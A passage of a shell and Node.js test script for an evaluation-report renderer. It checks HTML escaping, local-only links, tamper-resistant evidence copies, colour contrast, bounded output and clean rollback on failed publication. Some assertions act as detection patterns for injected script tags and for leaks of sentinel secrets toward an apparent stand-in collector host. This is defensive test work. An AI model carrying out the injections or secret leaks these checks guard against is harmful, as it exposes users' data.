assert.doesNotMatch(blocked, /<(?:script|img)(?:\s|>)/i);
assert.match(blocked, /<strong>escaped-output<\/strong> — Fail/);
assert.match(degraded, /Execution status: <strong>Degraded<\/strong>/);
assert.match(degraded, /Candidate-only evidence/);
assert.doesNotMatch(degraded, /controlled catalog selection|host-loader proof/i);

const hrefs = [...complete.matchAll(/href="([^"]+)"/g)].map((match) => match[1]);
assert.ok(hrefs.length > 0, 'report must link local evidence identities');
for (const href of hrefs) {
  assert.doesNotMatch(href, /^(?:[a-z][a-z0-9+.-]*:|\/\/|\/)/i);
  assert.doesNotMatch(href, /[\\\u0000-\u001f\u007f]/);
}
const receiptLink = complete.match(
  /<a href="([^"]+\.json)">Open local evidence<\/a><span class="evidence-identity">evidence\/action\.behavior\.escape-case\.candidate\.1\.json/,
);
assert.ok(receiptLink, 'hash-matched JSON receipt must link a report-owned copy');
const receiptAsset = path.join(root, decodeURIComponent(receiptLink[1]));
const receiptAssetState = await lstat(receiptAsset);
assert.ok(receiptAssetState.isFile() && !receiptAssetState.isSymbolicLink());
const expectedReceipt = Buffer.from('{"status":"complete","source":"fixture"}\n', 'utf8');
assert.deepEqual(await readFile(receiptAsset), expectedReceipt);
assert.equal(
  `sha256:${createHash('sha256').update(await readFile(receiptAsset)).digest('hex')}`,
  `sha256:${createHash('sha256').update(expectedReceipt).digest('hex')}`,
);
await writeFile(
  path.join(root, 'evidence', 'action.behavior.escape-case.candidate.1.json'),
  '{"status":"tampered"}\n',
);
assert.deepEqual(
  await readFile(receiptAsset),
  expectedReceipt,
  'published evidence must not follow later source-path mutation',
);

function channel(value) {
  const normalized = value / 255;
  return normalized <= 0.04045 ? normalized / 12.92 : ((normalized + 0.055) / 1.055) ** 2.4;
}
function luminance(hex) {
  const bytes = [1, 3, 5].map((index) => Number.parseInt(hex.slice(index, index + 2), 16));
  return (0.2126 * channel(bytes[0])) + (0.7152 * channel(bytes[1])) + (0.0722 * channel(bytes[2]));
}
function contrast(foreground, background) {
  const values = [luminance(foreground), luminance(background)].sort((a, b) => b - a);
  return (values[0] + 0.05) / (values[1] + 0.05);
}
for (const [foreground, background] of [
  ['#153e25', '#e4f5e8'],
  ['#633c00', '#fff1cc'],
  ['#6b1515', '#fde7e7'],
]) {
  assert.ok(complete.includes(foreground) && complete.includes(background));
  assert.ok(contrast(foreground, background) >= 4.5, `${foreground} contrast must be at least 4.5:1`);
}

assert.ok(terminal.length <= 1024, 'terminal summary must be byte-bounded');
assert.doesNotMatch(terminal.toString('latin1'), /[\x00-\x09\x0b-\x1f\x7f]/);
const terminalText = terminal.toString('utf8');
assert.match(terminalText, /^Execution status: complete$/m);
assert.match(terminalText, /^Aggregate: .*complete\.json$/m);
assert.match(terminalText, /^Report: .*complete\.html$/m);
assert.match(terminalText, /^Isolation assurance: enforced$/m);
const advisoryTerminalText = advisoryTerminal.toString('utf8');
assert.match(advisoryTerminalText, /^Isolation assurance: advisory$/m);
assert.match(advisoryTerminalText, /Behavior evidence only; capability isolation was not enforced/);
assert.doesNotMatch(terminalText, /controlled catalog selection|host-loader proof/i);
const triggerTerminalText = triggerTerminal.toString('utf8');
assert.match(triggerTerminalText, /controlled catalog selection/i);
assert.match(triggerTerminalText, /not host-loader proof/i);
const mixedTerminalText = mixedTerminal.toString('utf8');
assert.match(mixedTerminalText, /controlled catalog selection/i);
assert.match(mixedTerminalText, /not host-loader proof/i);
assert.doesNotMatch(terminalText, /TOP_SECRET|DO_NOT_PRINT_THIS|collector\.invalid|RAW_EVIDENCE_SECRET/);
NODE

count_report_assets() {
  count=0
  for asset in "$TMP_ROOT"/.woostack-report-*; do
    [ ! -e "$asset" ] || count=$((count + 1))
  done
  printf '%s\n' "$count"
}

before_report=$(cksum <"$TMP_ROOT/complete.html")
before_aggregate=$(cksum <"$TMP_ROOT/publicationFailure.json")
before_assets=$(count_report_assets)
set +e
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/publicationFailure.json" \
  --out "$TMP_ROOT/complete.html" \
  --terminal >"$TMP_ROOT/existing.stdout" 2>"$TMP_ROOT/existing.stderr"
existing_status=$?
set -e
[ "$existing_status" -ne 0 ] || fail "renderer overwrote an existing report"
[ "$(cksum <"$TMP_ROOT/complete.html")" = "$before_report" ] || fail "existing report changed"
[ "$(cksum <"$TMP_ROOT/publicationFailure.json")" = "$before_aggregate" ] || fail "aggregate changed on publication failure"
after_assets=$(count_report_assets)
[ "$after_assets" -eq "$before_assets" ] || fail "failed report publication left evidence assets"
[ "$(wc -c <"$TMP_ROOT/existing.stdout")" -le 1024 ] || fail "retained terminal evidence is unbounded"
LC_ALL=C grep -q '^Execution status: complete$' "$TMP_ROOT/existing.stdout" \
  || fail "publication failure lost terminal execution status"
LC_ALL=C grep -q '^Aggregate: .*publicationFailure\.json$' "$TMP_ROOT/existing.stdout" \
  || fail "publication failure lost terminal aggregate path"
LC_ALL=C grep -q '^Report: .*complete\.html$' "$TMP_ROOT/existing.stdout" \
  || fail "publication failure lost terminal report path"
if LC_ALL=C grep -q 'TOP_SECRET\|DO_NOT_PRINT_THIS' "$TMP_ROOT/existing.stdout"; then
  fail "retained terminal evidence leaked an untrusted secret"
fi
[ "$(wc -c <"$TMP_ROOT/existing.stderr")" -le 512 ] || fail "publication diagnostic is unbounded"
for temp_path in "$TMP_ROOT"/.complete.html.*.tmp; do
  [ ! -e "$temp_path" ] || fail "failed publication left a temporary file"
done

assert_failure_preserves_aggregate() {
  fixture=$1
  out=$2
  before=$(cksum <"$fixture")
  set +e
  "$NODE" "$RENDERER" --aggregate "$fixture" --out "$out" \
    >"$TMP_ROOT/failure.stdout" 2>"$TMP_ROOT/failure.stderr"
  status=$?
  set -e
  [ "$status" -ne 0 ] || fail "invalid fixture unexpectedly rendered: $fixture"
  [ ! -e "$out" ] || fail "failed render created output: $out"
  [ "$(cksum <"$fixture")" = "$before" ] || fail "failed render changed JSON evidence: $fixture"
  [ ! -s "$TMP_ROOT/failure.stdout" ] || fail "failed render wrote stdout"
  [ "$(wc -c <"$TMP_ROOT/failure.stderr")" -le 512 ] || fail "failure diagnostic is unbounded"
  if LC_ALL=C grep -q 'TOP_SECRET\|DO_NOT_PRINT_THIS' "$TMP_ROOT/failure.stderr"; then
    fail "failure diagnostic leaked an untrusted secret"
  fi
}

assert_failure_preserves_aggregate "$TMP_ROOT/malformed.json" "$TMP_ROOT/malformed.html"
assert_failure_preserves_aggregate "$TMP_ROOT/invalid.json" "$TMP_ROOT/invalid.html"
assert_failure_preserves_aggregate "$TMP_ROOT/unsafe.json" "$TMP_ROOT/unsafe.html"
assert_failure_preserves_aggregate "$TMP_ROOT/too-large.json" "$TMP_ROOT/too-large.html"
assert_failure_preserves_aggregate "$TMP_ROOT/aggregate-symlink.json" "$TMP_ROOT/aggregate-symlink.html"
for forged_fixture in "$TMP_ROOT"/forged-*.json; do
  assert_failure_preserves_aggregate \
    "$forged_fixture" "${forged_fixture%.json}.html"
done
set +e
"$NODE" "$RENDERER" \
  --aggregate "$TMP_ROOT/invalid.json" \
  --out "$TMP_ROOT/invalid-terminal.html" \
  --terminal >"$TMP_ROOT/invalid-terminal.stdout" 2>"$TMP_ROOT/invalid-terminal.stderr"
invalid_terminal_status=$?
set -e
[ "$invalid_terminal_status" -ne 0 ] || fail "invalid aggregate with --terminal unexpectedly rendered"
[ ! -e "$TMP_ROOT/invalid-terminal.html" ] || fail "invalid aggregate created a terminal report"
[ ! -s "$TMP_ROOT/invalid-terminal.stdout" ] || fail "pre-validation failure wrote terminal evidence"
[ "$(wc -c <"$TMP_ROOT/invalid-terminal.stderr")" -le 512 ] || fail "invalid aggregate diagnostic is unbounded"

assert_failure_preserves_aggregate "$TMP_ROOT/complete.json" "$TMP_ROOT/no-such-parent/report.html"

"$NODE" --input-type=module - \
  "$RENDERER" "$SCRIPT_DIR/../aggregate/safe-access.mjs" "$TMP_ROOT/publication-tests" <<'NODE'
import assert from 'node:assert/strict';
import { mkdir, readFile, readdir, unlink, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

const [rendererPath, publisherPath, root] = process.argv.slice(2);
const renderer = await import(pathToFileURL(rendererPath).href);
const publication = await import(pathToFileURL(publisherPath).href);
assert.equal(
  renderer.publishCreateNew,
  publication.publishCreateNew,
  'renderer must use the shared aggregate publication authority',
);

async function privateDirectory(name) {
  const directory = path.join(root, name);
  await mkdir(directory, { recursive: true, mode: 0o700 });
  return directory;
}

const syncRoot = await privateDirectory('sync-failure');
const syncOut = path.join(syncRoot, 'report.html');
let syncCalls = 0;
await assert.rejects(
  publication.publishCreateNew(syncOut, 'not committed', {
    syncDirectory: async (handle) => {
      syncCalls += 1;
      if (syncCalls === 1) throw new Error('injected directory sync failure');
      await handle.sync();
    },
  }),
  /injected directory sync failure/,
);
await assert.rejects(readFile(syncOut), (error) => error?.code === 'ENOENT');
assert.deepEqual(await readdir(syncRoot), [], 'pre-commit sync failure must clean both links');

const replacementRoot = await privateDirectory('replacement-race');
const replacementOut = path.join(replacementRoot, 'report.html');
await assert.rejects(
  publication.publishCreateNew(replacementOut, 'publisher bytes', {
    syncDirectory: async () => {
      await unlink(replacementOut);
      await writeFile(replacementOut, 'replacement bytes', { flag: 'wx' });
      throw new Error('injected replacement race');
    },
  }),
  /rollback refused an unexpected final file/,
);
assert.equal(
  await readFile(replacementOut, 'utf8'),
  'replacement bytes',
  'rollback must not unlink a replacement pathname',
);
assert.deepEqual(
  (await readdir(replacementRoot)).filter((name) => name.includes('.tmp')),
  [],
  'replacement refusal must still clean the private temporary link',
);

const cleanupRoot = await privateDirectory('cleanup-failure');
const cleanupOut = path.join(cleanupRoot, 'report.html');
let cleanupCalls = 0;
await assert.rejects(
  publication.publishCreateNew(cleanupOut, 'not committed', {
    removeTemp: async (tempPath) => {
      cleanupCalls += 1;
      if (cleanupCalls === 1) throw new Error('injected pre-commit temp unlink failure');
      await unlink(tempPath);
    },
  }),
  /injected pre-commit temp unlink failure/,
);
assert.equal(cleanupCalls, 2, 'failed first unlink must be retried during rollback cleanup');
assert.deepEqual(
  await readdir(cleanupRoot),
  [],
  'pre-commit temporary unlink failure must leave no final or temporary link',
);
await publication.publishCreateNew(cleanupOut, 'committed on retry');
assert.equal(await readFile(cleanupOut, 'utf8'), 'committed on retry');
assert.deepEqual(await readdir(cleanupRoot), ['report.html']);

const committedRoot = await privateDirectory('committed-cleanup-failure');
const committedOut = path.join(committedRoot, 'report.html');
let committedError;
try {
  await publication.publishCreateNew(committedOut, 'committed bytes', {
    closeOpenedHandle: async (handle, openedPath) => {
      await handle.close();
      if (openedPath === committedRoot) throw new Error('injected committed cleanup failure');
    },
  });
} catch (error) {
  committedError = error;
}
assert.equal(committedError?.code, 'publication-committed');
assert.ok(committedError?.publicationIdentity);
assert.equal(await readFile(committedOut, 'utf8'), 'committed bytes');
await publication.rollbackCreateNew(committedOut, committedError.publicationIdentity);
assert.deepEqual(await readdir(committedRoot), []);
NODE

set +e
"$NODE" "$RENDERER" --aggregate "$TMP_ROOT/complete.json" \
  >"$TMP_ROOT/usage.stdout" 2>"$TMP_ROOT/usage.stderr"
usage_status=$?
set -e
[ "$usage_status" -ne 0 ] || fail "missing --out unexpectedly succeeded"
[ ! -s "$TMP_ROOT/usage.stdout" ] || fail "usage failure wrote stdout"
[ "$(wc -c <"$TMP_ROOT/usage.stderr")" -le 512 ] || fail "usage diagnostic is unbounded"

printf 'PASS: escaped, accessible, bounded evaluation reporting\n'
